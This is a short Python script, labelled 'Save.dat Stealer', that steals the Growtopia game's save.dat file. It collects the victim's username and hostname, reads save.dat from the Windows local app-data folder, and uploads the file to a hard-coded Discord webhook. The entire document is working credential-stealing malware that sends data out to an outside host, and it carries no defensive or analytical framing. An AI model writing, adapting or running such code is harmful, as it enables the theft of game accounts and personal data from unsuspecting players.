from os import getenv
import socket
from discord_webhook import DiscordWebhook, DiscordEmbed

a = "https://discord.com/api/webhooks/1039989620584235120/Ntt-Wb3glQlMT46YvAhogjnHKLngP6WAYvj4q1wlIOWsE8ddEtSHYrr3Znb6j5Yicqyt"  # YOUR WEBHOOK URL
b="New Account From: "+getenv("username")+" / "+socket.gethostname()
webhook = DiscordWebhook(url=a, username="Save.dat Stealer",content=b)

c=getenv("LOCALAPPDATA")+ "\\Growtopia\\save.dat"
with open(c, "rb") as f:
     webhook.add_file(file=f.read(), filename='save.dat')
response = webhook.execute()

